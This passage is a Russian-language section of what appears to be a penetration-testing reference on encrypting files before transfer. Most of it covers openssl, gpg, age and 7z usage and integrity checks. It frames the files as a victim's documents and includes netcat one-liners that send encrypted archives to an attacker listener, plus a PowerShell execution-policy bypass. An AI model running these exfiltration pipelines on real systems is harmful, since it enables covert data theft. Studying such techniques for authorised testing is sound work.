# 11 - Шифрование файла перед передачей

> [← README](../../README_RU.md) · [Следующий раздел →](12-dns-icmp.md)

Задача: файл уехал по чужому каналу и без пароля/ключа бесполезен.

**Порядок:** `tar/zip -> шифрование -> base64 (если канал текстовый) -> передача -> sha256`.

```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export PASS='MyStr0ngP@ssphrase!2026'
```

## Быстрый выбор

| Ситуация | Инструмент |
|---|---|
| Нужен пароль, openssl есть везде | `openssl enc` |
| Нужна нормальная аутентификация | `age` / `gpg` |
| Архив + скрыть имена файлов | `7z -mhe=on` |
| Публичный ключ получателя | `gpg -e` / `age -r` |
| Текстовый канал (почта, DNS, чат) | `-base64` / `-a` |
| Windows без софта | PowerShell AES / 7-Zip / Gpg4win |
| Много файлов | `tar czf - dir/` -> `age` / `gpg` |

> `zip -e` (ZipCrypto), ECB и `openssl enc` без MAC - не для реальных секретов. Пароль передаём **другим каналом**.

## Режимы блочных шифров

| Режим | Когда | Минус |
|---|---|---|
| ECB | никогда | одинаковые блоки = одинаковый шифртекст |
| CBC | старые системы, `openssl enc` | нужен IV, нет встроенного MAC |
| CTR | потоковые данные | нет MAC, повтор nonce = катастрофа |
| GCM | по умолчанию для нового | нужен уникальный nonce |

> Для файлов практичнее не выбирать режим вручную, а взять `age` (ChaCha20-Poly1305) или `gpg`.

---

# 🐧Linux

## Подготовка архива

```bash
# один файл или папка
tar czf data.tar.gz secret.zip
tar czf data.tar.gz /home/victim/documents/

# хеш до шифрования
sha256sum data.tar.gz > data.sha256
```

## openssl enc (быстро, пароль)

```bash
# зашифровать
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt \
  -in data.tar.gz -out data.enc

# расшифровать
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
  -in data.enc -out data.tar.gz
```

```bash
# пароль из переменной, чтобы не светить в ps
PASS='MyStr0ngP@ssphrase!2026' openssl enc -aes-256-cbc -pbkdf2 -iter 100000 \
  -salt -pass env:PASS -in data.tar.gz -out data.enc

# пароль из файла
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt \
  -pass file:/tmp/key.txt -in data.tar.gz -out data.enc
```

**Для текстового канала - сразу base64:**

```bash
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 \
  -in data.tar.gz -out data.enc.b64

openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -base64 \
  -in data.enc.b64 -out data.tar.gz
```

**Одной строкой через netcat:**

```bash
# RHOST -> LHOST
tar czf - secret.zip | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 | nc $LHOST 4444

# LHOST
nc -lvnp 4444 | openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -base64 | tar xzf -
```

> `openssl enc` с CBC **не проверяет целостность**. Пароль/данные могут быть подменены незаметно. Для важного - `gpg` или `age`.

## gpg: симметрично (один пароль)

```bash
# зашифровать (пароль спросит интерактивно)
gpg --symmetric --cipher-algo AES256 --s2k-digest-algo SHA512 \
  --s2k-count 65011712 --output data.tar.gz.gpg data.tar.gz

# расшифровать
gpg --decrypt --output data.tar.gz data.tar.gz.gpg

# текстовый канал: ASCII-armor
gpg --symmetric --armor --cipher-algo AES256 --output data.asc data.tar.gz
gpg --decrypt --output data.tar.gz data.asc
```

**Без интерактива (пароль в файле):**

```bash
chmod 600 pass.txt
gpg --batch --yes --pinentry-mode loopback --passphrase-file pass.txt \
  --symmetric --cipher-algo AES256 --output data.gpg data.tar.gz

gpg --batch --yes --pinentry-mode loopback --passphrase-file pass.txt \
  --output data.tar.gz --decrypt data.gpg
```

**Пароль из stdin:**

```bash
printf '%s' "$PASS" | gpg --batch --yes --pinentry-mode loopback --passphrase-fd 0 \
  --symmetric --cipher-algo AES256 --output data.gpg data.tar.gz
```

## gpg: асимметрично (публичный ключ)

```bash
# 1. Ключ: подпись ed25519 + шифрование cv25519
gpg --quick-generate-key "Alice <alice@example.com>" ed25519 sign 2y
FPR=$(gpg --list-keys --with-colons | awk -F: '/^fpr:/ {print $10; exit}')
gpg --quick-add-key "$FPR" cv25519 encr 2y

# 2. Отдать публичный ключ
gpg --armor --export alice@example.com > alice.pub.asc

# 3. Получатель импортирует и проверяет отпечаток
gpg --import alice.pub.asc
gpg --fingerprint alice@example.com

# 4. Доверие (в интерактивном меню: trust -> 5 -> y -> quit)
gpg --edit-key alice@example.com

# 5. Шифрование / расшифровка
gpg --encrypt --recipient alice@example.com --output data.gpg data.tar.gz
gpg --decrypt --output data.tar.gz data.gpg

# 6. Подпись и проверка
gpg --detach-sign --armor data.tar.gz
gpg --verify data.tar.gz.asc data.tar.gz

# 7. Шифрование + подпись
gpg --encrypt --sign --recipient alice@example.com --local-user me@example.com \
  --output data.gpg data.tar.gz
```

**Посмотреть, что внутри:**

```bash
gpg --list-packets data.gpg
# видно алгоритм, key id, mdc/aead
```

## age (просто и с аутентификацией)

```bash
sudo apt install -y age

# ключи
age-keygen -o key.txt          # публичный ключ печатается в stderr
cat key.txt

# шифрование получателю
age -r age1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \
  -o data.tar.gz.age data.tar.gz

# расшифровка
age -d -i key.txt -o data.tar.gz data.tar.gz.age

# паролем
age -p -o data.tar.gz.age data.tar.gz
age -d -o data.tar.gz data.tar.gz.age

# текстовый канал
age -p -a -o data.asc data.tar.gz
```

## 7z

```bash
# архив + AES-256 + скрытые имена файлов
7z a -p'P@ssw0rd' -mhe=on -mx=9 data.7z data.tar.gz
7z a -p'P@ssw0rd' -mhe=on -mx=9 data.7z /home/victim/documents/

# распаковать
7z x data.7z -o./out
```

---

# 🪟Windows

## 7-Zip

```powershell
winget install --id 7zip.7zip -e
# или choco install 7zip
```

```cmd
"C:\Program Files\7-Zip\7z.exe" a -p"P@ssw0rd" -mhe=on -mx=9 out.7z C:\Users\Public\secrets.zip
"C:\Program Files\7-Zip\7z.exe" x out.7z -oD:\extracted
```

## Gpg4win

```powershell
winget install --id GnuPG.Gpg4win -e
gpg --version
```

```powershell
# симметрично
gpg --symmetric --cipher-algo AES256 --output .\file.gpg .\file
gpg --decrypt --output .\file .\file.gpg

# асимметрично
gpg --encrypt --recipient alice@example.com --output .\file.gpg .\file
gpg --decrypt --output .\file .\file.gpg
```

> В PowerShell не используйте `>` для расшифровки - он портит бинарные данные. Только `--output`.

## PowerShell AES (без установки)

Скрипт опубликован автором как gist: [`ddumicz/Invoke-AESEncryption.ps1`](https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad). В этом репозитории его **нет**. Скачайте его на Windows любым каналом (сохраните как `Invoke-AESEncryption.ps1`), затем импортируйте:

```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
Import-Module .\Invoke-AESEncryption.ps1
```

```powershell
# файл
Invoke-AESEncryption -Mode Encrypt -Key "MyStr0ngP@ssw0rd!2024" -Path "C:\Temp\secrets.zip"
Invoke-AESEncryption -Mode Decrypt -Key "MyStr0ngP@ssw0rd!2024" -Path "C:\Temp\secrets.zip.aes"

# строка
Invoke-AESEncryption -Mode Encrypt -Key "MyStr0ngP@ssw0rd!2024" -Text "secret text"
Invoke-AESEncryption -Mode Decrypt -Key "MyStr0ngP@ssw0rd!2024" -Text "...."
```

> Скрипт использует CBC без MAC. Для точного round-trip бинарей заменить `PaddingMode::Zeros` на `PKCS7` на обеих сторонах. Лицензия в gist не указана: считайте его сторонним кодом и уточняйте условия у автора перед распространением (см. раздел [«Авторство»](../../README_RU.md#авторство)).

## CMS (PKCS#7, только если есть сертификат)

```powershell
Get-ChildItem Cert:\CurrentUser\My -DocumentEncryptionCert

Protect-CmsMessage -To "<thumbprint>" -Path C:\Temp\secrets.txt -OutFile C:\Temp\secrets.cms
Unprotect-CmsMessage -Path C:\Temp\secrets.cms -To "<thumbprint>" | Set-Content C:\Temp\secrets.txt
```

## certutil (кодирование, не шифрование)

```cmd
certutil -encode file.bin file.b64
certutil -decode file.b64 file.bin
certutil -hashfile file.bin SHA256
```

---

# Проверка целостности

```bash
# Linux
sha256sum data.tar.gz > data.sha256
sha256sum -c data.sha256
```

```powershell
# Windows
Get-FileHash C:\Temp\data.tar.gz -Algorithm SHA256
certutil -hashfile C:\Temp\data.tar.gz SHA256
```

> `sha256` рядом с файлом защищает от случайной порчи, но **не от злоумышленника**: он может подменить и файл, и хеш. От подмены помогает MAC/AEAD (`age`, `gpg`) или подпись.

---

# Готовые схемы передачи

## Текстовый канал (почта, чат, DNS)

```bash
# отправитель: архив -> age -> base64
tar czf - secret.zip | age -p -a | base64 -w0 > payload.txt

# получатель
base64 -d payload.txt | age -d | tar xzf -
```

```bash
# то же через gpg
tar czf - secret.zip | gpg -c --armor | base64 -w0 > payload.txt
base64 -d payload.txt | gpg -d | tar xzf -
```

## Бинарный канал (nc, /dev/tcp, HTTP)

```bash
# отправитель
tar czf - secret.zip | age -p | nc $LHOST 4444

# получатель
nc -lvnp 4444 | age -d | tar xzf -
```

> Если `age -p` мешает в конвейере, используйте `age -r <публичный_ключ>`.

## Большой файл по кускам

```bash
# порезать
split -b 5M data.enc.b64 part_

# собрать
cat part_* > data.enc.b64
base64 -d data.enc.b64 > data.enc
```

---

# Если не работает

| Ошибка | Причина | Решение |
|---|---|---|
| `bad decrypt` | неверный пароль / другой алгоритм / забыт `-base64` | проверить пароль и все флаги |
| `wrong final block length` | файл обрезан или это не тот формат | сверить размер/`sha256` |
| `gpg: decryption failed: No secret key` | файл зашифрован не на ваш ключ | проверить `--recipient` / `--list-packets` |
| `gpg: public key decryption failed` | нет приватного ключа | импортировать ключ, проверить `--list-secret-keys` |
| `There is no assurance this key belongs...` | ключу не выставлено доверие | `gpg --edit-key` -> `trust` |
| PowerShell: файл битый после `>` | PowerShell меняет кодировку/байты | использовать `--output` |
| `age: identity file not found` | неверный путь к ключу | `-i /path/key.txt` |
| `7z: Wrong password` | пароль/битый архив | проверить пароль, `7z t data.7z` |
| `tar: Unexpected EOF` | передача оборвалась | докачать, проверить `sha256` |

**Мини-чек-лист:** архив -> шифр -> base64 (если текст) -> передача -> `sha256` -> расшифровка -> `tar tzf`/`unzip -t`.

---

[← Назад к справочнику](../../README_RU.md)
